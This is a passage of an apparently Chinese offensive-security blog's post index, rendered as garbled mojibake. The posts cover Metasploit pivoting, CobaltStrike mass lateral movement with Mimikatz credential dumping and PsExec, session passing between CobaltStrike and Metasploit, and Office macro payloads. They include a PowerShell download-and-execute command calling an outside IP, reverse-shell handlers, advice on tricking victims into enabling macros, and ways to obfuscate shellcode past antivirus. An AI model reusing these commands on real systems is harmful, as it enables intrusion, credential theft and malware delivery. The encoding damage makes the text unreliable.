ä¸Šè¿°æ˜¯åœ¨meterpreteræƒé™ä¸­æ·»åŠ ï¼Œæˆ–å½“çŸ¥é“ç›®æ ‡è·¯ç”±è¡¨ä¿¡æ¯æ—¶ï¼Œå¯ç›´æ¥æ·»åŠ ã€‚ 12msf5 exploit(multi/handler) &gt; route add 172.20.20.0/24 1 //session id 1msf5 exploit(multi/handler) &gt; route å¯åœ¨metasploitç»§ç»­æ¸—é€ï¼Œæˆ–å¼€å¯ä¸€ä¸ªsocksï¼ŒæŒ‚è½½å…¶ä»–å·¥å…·ä¸Šå¤šå±‚ç©¿é€ã€‚ 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j æ€»ç»“å†…ç½‘ç©¿é€æ—¶ï¼Œä»£ç†éœ€è¦ç¨³å®šã€éšè”½ï¼Œæ€è·¯æ›´éœ€è¦ä¸æ–­çš„æ‹“å®½ã€‚æ¯•ç«Ÿåœ¨å®æˆ˜ä¸­ï¼Œå¤šä¹ˆå¤æ‚çš„ç¯å¢ƒéƒ½ä¼šé‡åˆ°ï¼Œæ›´å¤šçš„æ˜¯æ€»ç»“ä¸åŒæ‰“æ³•ï¼Œè¿›è¡Œè½åœ°ï¼Œæœ€ç»ˆå°†å†…ç½‘çš„â€œå¤§é—¨â€æ‰“å¼€ï¼ æœ‰ä¸åŒè§è§£ï¼Œæˆ–æ›´ä¼˜çš„æ–¹æ³•å¯éšæ—¶äº¤æµ^_^","categories":[],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrikeè¿›é˜¶ç¯‡-æ‰¹é‡ä¸Šçº¿","slug":"CobaltStrikeè¿›é˜¶ç¯‡-æ‰¹é‡ä¸Šçº¿","date":"2019-12-12T18:00:36.000Z","updated":"2021-07-07T07:16:08.873Z","comments":true,"path":"2019/1213/.html","link":"","permalink":"https://payloads.cn/2019/1213/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€å½“è·å–ä¸€å°ç›®æ ‡æœåŠ¡å™¨æƒé™æ—¶ï¼Œæ›´å¤šæ˜¯æƒ³åŠæ³•æ‰©å¤§æˆ˜æœï¼Œè·å–ç›®æ ‡å‡­æ®å¹¶æ¨ªå‘è¿›è¡Œç™»é™†æ˜¯æœ€å¿«é€Ÿçš„æ‹¿æƒæ–¹å¼ã€‚ä½†ç›®æ ‡æ‰€å¤„ç¯å¢ƒæ˜¯å¦å¯å‡ºç½‘ï¼Œå¦‚ä½•åˆ©ç”¨CobalStrikeè¿›è¡Œæ‰¹é‡ä¸Šçº¿ï¼Œæ­£æ˜¯æœ¬æ–‡æ‰€è¦è®²è¿°çš„å†…å®¹ã€‚ è·å–å‡­æ®ç›®æ ‡æœºå™¨CobalStrikeä¸Šçº¿åï¼Œé€šå¸¸å…ˆæŠ“å–è¯¥ä¸»æœºå‡­æ®ï¼Œé€‰æ‹©æ‰§è¡Œ Accessâ€“&gt;Run Mimikatz ï¼Œæˆ–åœ¨Beaconä¸­æ‰§è¡Œlogonpasswordså‘½ä»¤ã€‚éœ€è¦å½“å‰ä¼šè¯ä¸ºç®¡ç†å‘˜æƒé™ï¼Œæ‰èƒ½æˆåŠŸï¼Œå¦‚æœæƒé™ä½ï¼Œè¯·å…ˆææƒ~ ç‚¹å‡»å·¥å…·æ çš„Credentialsï¼Œå¯ä»¥çœ‹åˆ°è·å–çš„å‡­æ®ä¿¡æ¯ã€‚ï¼ˆCredentialså¯è‡ªè¡Œæ·»åŠ ï¼‰ å½“ç„¶ï¼Œä¸æ˜¯æ¯æ¬¡éƒ½èƒ½æˆåŠŸè·å–åˆ°æ˜æ–‡å¯†ç çš„ï¼Œè¦çœ‹å†…å­˜ä¸­æ˜¯å¦å­˜å‚¨ã€‚ ç›®æ ‡æœºå‡ºç½‘psexecä¼ é€’è·å–å‡­æ®åï¼Œéœ€è¦å¯¹ç›®æ ‡ç½‘æ®µè¿›è¡Œç«¯å£å­˜æ´»æ¢æµ‹ï¼Œç¼©å°èŒƒå›´ã€‚æ¢æµ‹æ–¹å¼æ¯”è¾ƒå¤šï¼Œæœ¬æ–‡ä»…ä¾æ‰˜CobalStrikeæœ¬èº«å®Œæˆï¼Œä¸å€ŸåŠ©å…¶ä»–å·¥å…·ã€‚å› ä¸ºæ˜¯psexecä¼ é€’ç™»å½•ï¼Œè¿™é‡Œä»…éœ€æ¢æµ‹445ç«¯å£ã€‚ï¼ˆ psexecï¼šåœ¨ä¸»æœºä¸Šä½¿ç”¨æœåŠ¡æ´¾ç”Ÿä¼šè¯ ï¼‰ ä½¿ç”¨portscanå‘½ä»¤ï¼šipç½‘æ®µ â€” portsç«¯å£ â€” æ‰«æåè®®ï¼ˆarpã€icmpã€noneï¼‰â€” çº¿ç¨‹ï¼ˆå®æˆ˜ä¸è¦è¿‡é«˜ï¼‰ã€‚ 1beacon&gt; portscan 192.168.144.0/24 445 arp 200 ç‚¹å‡»å·¥å…·æ çš„Viewâ€“&gt;Targetsï¼ŒæŸ¥çœ‹ç«¯å£æ¢æµ‹åçš„å­˜æ´»ä¸»æœºã€‚ï¼ˆTargetså¯è‡ªè¡Œæ·»åŠ ï¼‰ é€‰æ‹©Loginâ€“&gt;psexecä¼ é€’ç™»å½•ã€‚ é€‰æ‹©ä¹‹å‰è·å–åˆ°çš„å‡­æ®ä¿¡æ¯ï¼ˆæ˜æ–‡å¯†æ–‡å‡å¯ï¼‰ï¼Œæ­¤å¤„é€‰æ‹©æ˜æ–‡ï¼Œå¹¶ç¡®å®šæ¥æ”¶çš„Listenerä¸ä¸»æœºçš„Sessionã€‚ åœ¨Beaconä¸­å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶ä¼šæ˜¾ç¤ºæˆåŠŸç™»å½•çš„ipï¼Œä¹‹åå°±ä¾¿ä¼šä¸Šçº¿CobalStrikeã€‚è¿™æ ·å°±æ§åˆ¶äº†å¤šä¸ªä¸»æœºçš„ç³»ç»Ÿæƒé™ã€‚ é™„ï¼špsexecå¯†æ–‡ä¼ é€’Beaconä¸­æ‰§è¡Œçš„å‘½ä»¤ã€‚ã€ä¸æ˜¯psexec(psh)é€‰é¡¹ã€‘ ç›®æ ‡æœºä¸å‡ºç½‘Link Listenerå®æˆ˜ä¸­å¾€å¾€è¿˜ä¼šé‡åˆ°é€šè¿‡æŸç§æ–¹å¼ï¼Œè·å–åˆ°ç›®æ ‡å†…ç½‘ä¸­æŸå°ä¸»æœºçš„ç³»ç»Ÿæƒé™ï¼Œä½†æ˜¯è¯¥ä¸»æœºå¤„åœ¨éš”ç¦»ç½‘ç»œä¸­ï¼Œä¸èƒ½å‡ºç½‘ã€‚å› ä¸ºCobalStrikeæœåŠ¡ç«¯æ˜¯æ­å»ºåœ¨äº’è”ç½‘ä¸­çš„ï¼Œé€šè¿‡å¸¸è§„æ–¹å¼æ˜¯æ— æ³•ä¸Šçº¿çš„ï¼Œè¿™é‡Œå°±éœ€è¦åˆ©ç”¨å·²ä¸Šçº¿çš„ä¸»æœºï¼Œå°†å®ƒåšä¸€ä¸ªListenerï¼Œå®ç°é“¾è·¯ä¸Šçº¿CobalStrikeã€‚ é¦–å…ˆï¼Œåœ¨å·²ä¸Šçº¿çš„ä¸»æœºåˆ›å»ºListenerï¼Œç›‘å¬ç«¯å£å¯è‡ªå®šä¹‰ã€‚ é€‰æ‹© Attacks-&gt;Packages-&gt;Windows Executable(Stageless)ï¼Œæ”¯æŒå¯¼å‡ºè¯¥ç±»å‹Listenerå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–dllç­‰ã€‚ æ³¨æ„ï¼Œé€‰æ‹©åˆšå»ºç«‹çš„Listeneråå­—ï¼ŒProxyå¯ä¸è®¾ç½®ï¼Œè¿™é‡Œç”Ÿæˆexeä¿å­˜æœ¬åœ°ã€‚(æœªå…æ€) ä¸Šä¼ åˆšæ‰ç”Ÿæˆçš„payloadåˆ°å½“å‰å·²ä¸Šçº¿çš„ç›®æ ‡æœºä¸­ï¼Œè¿˜éœ€è¦ä¸Šä¼ å¦ä¸€ä¸ªå·¥å…·PsExec.exe ã€‚ï¼ˆCobalStrikeæœ¬èº«psexecåŠŸèƒ½ä¸å¤Ÿå¼ºå¤§ï¼Œä¸”æ–¹æ³•ä¸å”¯ä¸€ï¼‰ åœ¨Beaconä¸­ä½¿ç”¨PsExecå·¥å…·å°†payloadä¸Šä¼ åˆ°ä¸å‡ºç½‘çš„ç›®æ ‡æœºä¸­ï¼Œè‡ªåŠ¨æ‰§è¡Œï¼Œä¸Šçº¿ã€‚ 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe ç«¯å£æŸ¥çœ‹ï¼Œå®é™…ä¸å‡ºç½‘ç›®æ ‡æœºï¼ˆ192.168.144.196ï¼‰æ˜¯ä¸å‡ºç½‘ç›®æ ‡æœºï¼ˆ192.168.144.155ï¼‰æ­£åœ¨å»ºç«‹è¿æ¥ã€‚ 1beacon&gt; shell netstat -ano |findstr 4444 å› ä¸ºè¿™æ˜¯linké“¾æ¥ï¼Œåªè¦ä¸»é“¾è·¯ï¼ˆå³å‡ºç½‘æœºListenerï¼‰æ‰çº¿ï¼Œå°±éƒ½ä¼šæ‰çº¿ï¼ SSHç™»å½•sshæ‰¹é‡ç™»å½•æ¯”è¾ƒç®€å•ï¼ŒåŒæ ·åˆ©ç”¨å½“å‰å·²ä¸Šçº¿çš„ç›®æ ‡æœºè¿›è¡Œç™»å½•ã€‚ 1beacon&gt; portscan 192.168.144.170-210 22 arp 200 åœ¨Credentialsä¸­æ·»åŠ sshçš„å£ä»¤ä¿¡æ¯ã€‚ï¼ˆsshå£ä»¤å¯äº‹å…ˆé€šè¿‡å…¶ä»–æ–¹å¼è·å–ï¼Œä¸å»ºè®®ç”¨æ­¤å·¥å…·è¿›è¡Œsshçˆ†ç ´ï¼Œæ•ˆç‡æ…¢ï¼‰ é€‰æ‹©Loginâ€“&gt;sshç™»å½•ã€‚ é€‰æ‹©åˆšæ·»åŠ çš„sshå£ä»¤ï¼Œä¸»æœºSessionï¼Œå³ä»å“ªå°ä¸»æœºè¿æ¥è¿‡å»ã€‚ sshæˆåŠŸç™»å½•åï¼Œå°±å®ç°äº†Linuxç›®æ ‡æœºçš„ä¸Šçº¿ï¼Œåœ¨Beaconä¸­å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤ã€‚è‹¥éœ€è¦ä¸Šçº¿çš„Linuxä¸»æœºä¸å¤šï¼Œå¯ç›´æ¥åœ¨Beaconä¸­æ‰§è¡Œå‘½ä»¤ã€‚ åœ¨Linuxç›®æ ‡æœºä¸­æŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ï¼Œå®é™…æ˜¯ä¸ä¹‹å‰å·²ä¸Šçº¿çš„Windowsä¸»æœºå»ºç«‹çš„è¿æ¥ã€‚ æ€»ç»“æœ¬æ–‡åªæ˜¯è®²è¿°é’ˆå¯¹ä¸åŒç¯å¢ƒçš„ä¸åŒä¸Šçº¿æ–¹å¼ï¼Œåˆ©ç”¨CobalStrikeå¯¹å·²è·å–æƒé™çš„ä¸»æœºè¿›è¡Œæ‰¹é‡ä¸Šçº¿ã€‚ä¸è¦æŠŠCobalStrikeå½“æˆæœ€ä¼˜çš„ç«¯å£æ¢æµ‹ä¸å£ä»¤çˆ†ç ´æ–¹å¼ï¼Œå·¥å…·çš„ç‰¹æ€§å¹¶ä¸åœ¨æ­¤ã€‚æ¯•ç«Ÿåœ¨å†…ç½‘ä¸­æ‹¿æƒè¦æœ‰æ•ˆç‡ï¼Œä¸èƒ½æµªè´¹å¤ªå¤šæ—¶é—´ï¼Œå·¥å…·é—´è¦è¿›è¡Œäº’è¡¥ï¼Œå‘æŒ¥å„è‡ªçš„ä¼˜åŠ¿ã€‚å½“ç„¶ï¼Œä¸Šçº¿çš„æ–¹å¼ä¹Ÿä¸è¦å±€é™æ­¤å¤„ï¼","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨","slug":"CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨","date":"2019-12-10T16:22:29.000Z","updated":"2021-07-07T07:16:16.272Z","comments":true,"path":"2019/1211/.html","link":"","permalink":"https://payloads.cn/2019/1211/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€CobalStrike ä¸ Metasploit å‡æ˜¯æ¸—é€åˆ©å™¨ï¼Œå„æœ‰æ‰€é•¿ã€‚å‰è€…æ›´é€‚åˆåšç¨³æ§å¹³å°ï¼Œåè€…åˆ™æ›´æ“…é•¿å†…ç½‘å„ç±»æ¢æµ‹æœé›†ä¸æ¼æ´åˆ©ç”¨ã€‚ä¸¤è€…æ›´éœ€è¦çµæ´»çš„è”åŠ¨ï¼Œå„è‡ªç›¸äº’ä¾æ‰˜ï¼Œä»è€Œæå‡æ¸—é€çš„æ•ˆç‡ã€‚ å†…ç½®SocksåŠŸèƒ½é€šè¿‡Beaconå†…ç½®çš„socksåŠŸèƒ½åœ¨VPSä¸Šå¼€å¯ä»£ç†ç«¯å£ï¼Œæ‰“é€šç›®æ ‡å†…ç½‘é€šé“ï¼Œä¹‹åå°†æœ¬åœ°Metasploitç›´æ¥å¸¦å…¥ç›®æ ‡å†…ç½‘ï¼Œè¿›è¡Œæ¨ªå‘æ¸—é€ã€‚ å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç†è®¾ç½®åœ¨å…¶ä»–çš„å·¥å…·ä¸Šï¼Œä¸é™äºProxychainsã€Proxifierç­‰ã€‚ é¦–å…ˆï¼Œåˆ°å·²æ§ç›®æ ‡æœºçš„Beaconä¸‹å°†socksä»£ç†å¼€å¯ã€‚ 1beacon &gt; socks 1024 #ç«¯å£æ ¹æ®VPSå®é™…æƒ…å†µè¿›è¡Œè®¾ç½® ç‚¹å¼€èœå•æ ä¸­çš„View &gt; Proxy Pivotsï¼Œå¤åˆ¶ä»£ç†è¿æ¥åˆ°Metasploitä¸­ã€‚ æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œå°±å¯ä»¥å¯¹ç›®æ ‡å†…ç½‘è¿›è¡Œå„ç§æ¢æµ‹æœé›†ã€‚å¦‚ æ¢æµ‹ç›®æ ‡å†…ç½‘ä¸­å­˜åœ¨MS17_010æ¼æ´çš„ä¸»æœºï¼Œè¿™ä¹Ÿæ˜¯å†…ç½‘æ‹¿ä¸»æœºæƒé™åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚ 123456msf5 &gt; setg Proxies socks4/5:ip:port #è®©msfæ‰€æœ‰æ¨¡å—çš„æµé‡éƒ½é€šè¿‡æ­¤ä»£ç†èµ°ã€‚(setgå…¨å±€è®¾ç½®)msf5 &gt; setg ReverseAllowProxy true #å…è®¸åå‘ä»£ç†ï¼Œé€šè¿‡socksåå¼¹shellï¼Œå»ºç«‹åŒå‘é€šé“ã€‚(æ¢æµ‹å¯ä»¥ä¸è®¾ç½®æ­¤é¡¹)msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 100 #å†…ç½‘æ¸—é€æ—¶çº¿ç¨‹ä¸è¦å¤ªé«˜ï¼msf5 &gt; run åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon shellå½“é€šè¿‡å…¶å®ƒæ–¹å¼æ‹¿åˆ°äº†ç›®æ ‡å†…ç½‘ä¸­æŸå°Windowsæœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜æ˜æ–‡å¯†ç æˆ–hashæ—¶ï¼Œå¯åˆ©ç”¨Metasploitä¸‹auxiliary/admin/smb/psexec_commandæ¨¡å—ï¼Œç›´æ¥ä¸Šçº¿æŒ‡å®šç›®æ ‡æœºå™¨çš„Beacon shellã€‚**(å‰æç›®æ ‡æœºå¯å‡ºç½‘)** å…ˆåˆ©ç”¨CobalStrikeç”Ÿæˆä¸Šçº¿Beaconçš„powershellã€‚ æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œè®¾ç½®psexec_commandæ¨¡å—å‚æ•°ã€‚ 12345678msf5 &gt; setg Proxies socks4/5:ip:portmsf5 &gt; use auxiliary/admin/smb/psexec_commandmsf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 10msf5 &gt; set smbuser administratormsf5 &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #æ˜æ–‡ã€å¯†æ–‡å‡å¯msf5 &gt; set command powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://149.28.xx.xx:80/a&#x27;))&quot; #ä¸Šçº¿CSçš„powershellï¼Œç›®æ ‡æœºå­˜åœ¨æ€è½¯éœ€è€ƒè™‘msf5 &gt; run æœ€ç»ˆï¼Œåªè¦å¯†ç ä¸€è‡´ã€ èƒ½å‡ºç½‘ï¼Œä¸”æœªè¢«æ€è½¯é˜»æ­¢çš„å‡ä¼šæˆåŠŸä¸Šçº¿ã€‚ CSä¸MSFä¼šè¯äº’ä¼ CobaltStrikeæ´¾ç”ŸMetasploitå½“CobaltStrikeè·å¾—äº†ä¸€ä¸ªä¸Šçº¿æœºå™¨ï¼Œæƒ³æŠŠè¿™ä¸ªç›®æ ‡ä¼ ç»™Metasploitä¸­çš„meterpreterï¼Œè·å¾—ä¸€ä¸ªsessionè¿›è¡Œæ§åˆ¶ã€‚åœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload windows/meterpreter/reverse_tcp #ä¸è¦ç”¨x64çš„payloadmsf5 &gt; set lhost 10.11.42.99msf5 &gt; set lport 5353msf5 &gt; run -j ä¹‹åä½¿ç”¨CobaltStrikeåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_tcpçš„Listenerã€‚å…¶ä¸­IPä¸ºMetasploitçš„ç›‘å¬åœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚ ç„¶åé€‰ä¸­è®¡ç®—æœºï¼Œå³é”®-&gt;Spawnï¼šé€‰æ‹©MSFçš„ç›‘å¬å™¨ï¼š è¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°ï¼ŒMetasploitä¸Šçš„ç›‘å¬å·²ç»ä¸Šçº¿ï¼Œç°åœ¨å¯ä»¥å¯¹meterpreterè·å¾—çš„sessionè¿›è¡Œæ§åˆ¶ã€‚ Metasploitæ´¾ç”ŸCobaltStrikeç°åœ¨å·²ç»è·å¾—äº†ä¸€ä¸ªmeterpreterçš„sessionï¼ŒæŠŠsessionä¼ ç»™CobaltStrikeã€‚ åœ¨CobaltStrikeä¸­åˆ›å»ºä¸€ä¸ªç›‘å¬è€…ï¼Œå’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œè¿™é‡Œhostéœ€è¦ä¿®æ”¹ä¸ºCobaltStrikeå®¢æˆ·ç«¯IPï¼Œåˆ›å»ºå¥½ä¹‹åä¾¿ç›‘å¬8099ç«¯å£ï¼Œç­‰å¾…ç€è¢«æ§æœºè¿æ¥ã€‚ \u0001æ¥ä¸‹æ¥ï¼ŒæŠŠmeterpreterè·å¾—çš„sessionè½¬äº¤ç»™CobaltStrikeï¼Œåœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12345678meterpreter &gt; background msf5 &gt; use exploit/windows/local/payload_inject msf5 &gt; set payload windows/meterpreter/reverse_httpmsf5 &gt; set lhost 192.168.144.174msf5 &gt; set lport 8099msf5 &gt; set DisablePayloadHandler true msf5 &gt; set session 1msf5 &gt; run è§£é‡Šä¸€ä¸‹è¿™äº›å‚æ•°ã€‚ç”±äºCobaltStrikeçš„ç›‘å¬å™¨æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ï¼š windows/beacon_http/reverse_http æ‰€ä»¥æˆ‘ä»¬çš„payloadä¹Ÿè¦ä½¿ç”¨ï¼š payload windows/meterpreter/reverse_http è®¾ç½®æœ¬åœ°ç›‘å¬IPå’Œç«¯å£ï¼šç”±äºç›‘å¬å™¨æ˜¯CobaltStrikeçš„ï¼Œæ‰€ä»¥è¦è®¾ç½®æˆCobaltStrikeæœºå™¨çš„IPä¸ç«¯å£ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ç½®ï¼š set DisablePayloadHandler true è®¾ç½®å½“å‰çš„sessionï¼Œæ‰§è¡Œrunã€‚ æ­¤æ—¶ç›®æ ‡æœºä¾¿å·²æˆåŠŸä»CobaltStrikeä¸Šçº¿ã€‚ æ€»ç»“å…³äºCobalStrikeä¸Metasploit çš„è”åŠ¨åˆ©ç”¨æ–¹å¼è¿œä¸æ­¢è¿™äº›ï¼Œæ¯ç§æ–¹å¼åœ¨å®æˆ˜ä¸­éƒ½æœ‰å¯¹åº”çš„åº”ç”¨åœºæ™¯ï¼Œæ›´éœ€è¦æ¢ç´¢ä¸æ€»ç»“ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Officeå®çš„åŸºæœ¬åˆ©ç”¨","slug":"Officeå®çš„åŸºæœ¬åˆ©ç”¨","date":"2019-12-09T06:35:09.000Z","updated":"2021-08-06T02:36:42.359Z","comments":true,"path":"2019/1209/.html","link":"","permalink":"https://payloads.cn/2019/1209/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€Officeå®ï¼Œè¯‘è‡ªè‹±æ–‡å•è¯Macroã€‚å®æ˜¯Officeè‡ªå¸¦çš„ä¸€ç§é«˜çº§è„šæœ¬ç‰¹æ€§ï¼Œé€šè¿‡VBAä»£ç ï¼Œå¯ä»¥åœ¨Officeä¸­å»å®ŒæˆæŸé¡¹ç‰¹å®šçš„ä»»åŠ¡ï¼Œè€Œä¸å¿…å†é‡å¤ç›¸åŒçš„åŠ¨ä½œï¼Œç›®çš„æ˜¯è®©ç”¨æˆ·æ–‡æ¡£ä¸­çš„ä¸€äº›ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚è€Œå®ç—…æ¯’æ˜¯ä¸€ç§å¯„å­˜åœ¨æ–‡æ¡£æˆ–æ¨¡æ¿çš„å®ä¸­çš„è®¡ç®—æœºç—…æ¯’ã€‚ä¸€æ—¦æ‰“å¼€è¿™æ ·çš„æ–‡æ¡£ï¼Œå…¶ä¸­çš„å®å°±ä¼šè¢«æ‰§è¡Œï¼Œäºæ˜¯å®ç—…æ¯’å°±ä¼šè¢«æ¿€æ´»ï¼Œè½¬ç§»åˆ°è®¡ç®—æœºä¸Šï¼Œå¹¶é©»ç•™åœ¨Normalæ¨¡æ¿ä¸Šã€‚ Visual Basic for Applicationsï¼ˆVBAï¼‰æ˜¯Visual Basicçš„ä¸€ç§å®è¯­è¨€ï¼Œæ˜¯å¾®è½¯å¼€å‘å‡ºæ¥åœ¨å…¶æ¡Œé¢åº”ç”¨ç¨‹åºä¸­æ‰§è¡Œé€šç”¨çš„è‡ªåŠ¨åŒ–(OLE)ä»»åŠ¡çš„ç¼–ç¨‹è¯­è¨€ã€‚ä¸»è¦èƒ½ç”¨æ¥æ‰©å±•Windowsçš„åº”ç”¨ç¨‹åºåŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯Microsoft Officeè½¯ä»¶ï¼Œä¹Ÿå¯è¯´æ˜¯ä¸€ç§åº”ç”¨ç¨‹å¼è§†è§‰åŒ–çš„Basic è„šæœ¬ã€‚ ç¯å¢ƒå‡†å¤‡ Windows 7 x64 æ——èˆ°ç‰ˆ Microsoft Office 2016 CobaltStrike 3.14 CobaltStrikeç”Ÿæˆå®å…ˆåˆ©ç”¨CobaltStrikeç”Ÿæˆå®payloadï¼Œæ¥ä¸‹æ¥åªè¦æ”¾å…¥wordã€excelæˆ–pptå³å¯ã€‚ åˆ›å»ºå®Wordæ‰“å¼€Wordæ–‡æ¡£ï¼Œç‚¹å‡» â€œWord é€‰é¡¹ â€” è‡ªå®šä¹‰åŠŸèƒ½åŒº â€” å¼€å‘è€…å·¥å…·(å‹¾é€‰) â€” ç¡®å®šâ€ ã€‚ ç¼–å†™ä¸»ä½“å†…å®¹åï¼Œç‚¹å‡» â€œå¼€å‘å·¥å…· â€” Visual Basicâ€ ã€‚ åŒå‡» â€œThisDocumentâ€ ï¼Œå°†åŸæœ‰å†…å®¹å…¨éƒ¨æ¸…ç©ºï¼Œç„¶åå°†CobaltStrikeç”Ÿæˆå®payloadå…¨éƒ¨ç²˜è´´è¿›å»ï¼Œä¿å­˜å¹¶å…³é—­è¯¥ VBA ç¼–è¾‘å™¨ ã€‚ å¦å­˜ä¸ºçš„Wordç±»å‹åŠ¡å¿…è¦é€‰â€Word 97-2003 æ–‡æ¡£ (*.doc)â€ï¼Œå³ doc æ–‡ä»¶ï¼Œä¿è¯ä½ç‰ˆæœ¬å¯ä»¥æ‰“å¼€ã€‚ä¹‹åå…³é—­ï¼Œå†æ‰“å¼€å³å¯æ‰§è¡Œå®ä»£ç ã€‚ åå¼¹Beacon shellé»˜è®¤æƒ…å†µä¸‹ï¼ŒOfficeå·²ç»ç¦ç”¨æ‰€æœ‰å®ï¼Œä½†ä»ä¼šåœ¨æ‰“å¼€Wordæ–‡æ¡£çš„æ—¶å€™å‘å‡ºé€šçŸ¥ã€‚ è¯±å¯¼ç›®æ ‡æ‰‹åŠ¨ç‚¹å‡»â€å¯ç”¨å†…å®¹â€å®ã€‚ ç›®æ ‡ä¸€æ—¦å¯ç”¨ï¼ŒCobaltStrikeçš„Beaconå°±ä¼šä¸Šçº¿ï¼Œå³æˆåŠŸæ¥æ”¶åˆ°Shellã€‚ å®ä»£ç åˆ†æCobaltStrikeç”Ÿæˆé»˜è®¤çš„VBAä¼šå¯¼å…¥å››ä¸ªWindows APIå‡½æ•°ï¼Œå¸¸è§çš„ShellCodeåŠ è½½å™¨ä»£ç ï¼š CreateRemoteThread åˆ›å»ºä¸€ä¸ªåœ¨å…¶å®ƒè¿›ç¨‹åœ°å€ç©ºé—´ä¸­è¿è¡Œçš„çº¿ç¨‹(ä¹Ÿç§°:åˆ›å»ºè¿œç¨‹çº¿ç¨‹). VirtualAllocEx æŒ‡å®šè¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´ä¿ç•™æˆ–æäº¤å†…å­˜åŒºåŸŸ WriteProcessMemory å†™å…¥æŸä¸€è¿›ç¨‹çš„å†…å­˜åŒºåŸŸ CreateProcess åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹å’Œå®ƒçš„ä¸»çº¿ç¨‹ï¼Œè¿™ä¸ªæ–°è¿›ç¨‹è¿è¡ŒæŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ å…¶ä¸­Array(-4,-24,-119,0,0,0,96,-119,-27...å°±æ˜¯ShellCodeï¼Œæ··æ·†çš„åŠæ³•æœ‰å¾ˆå¤šç§ã€‚ ShellCodeå¯ä»¥è‡ªå·±åœ¨VBAé‡Œè§£ç æˆ–è€…æ¯”å¦‚æ¯ä¸ªå…ƒç´ è‡ªå¢1ï¼Œè¿è¡Œçš„æ—¶å€™-1ï¼Œè¾¾åˆ°å…æ€ â€¦â€¦","categories":[],"tags":[{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"}]},{"title":"Shfitæ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•","slug":"Shfitæ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•","date":"2019-12-05T05:08:11.000Z","updated":"2021-07-07T07:18:29.174Z","comments":true,"path":"2019/1205/.html","link":"","permalink":"https://payloads.cn/2019/1205/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn æ˜ åƒåŠ«æŒç®€ä»‹æ˜ åƒåŠ«æŒï¼ˆImage File Execution 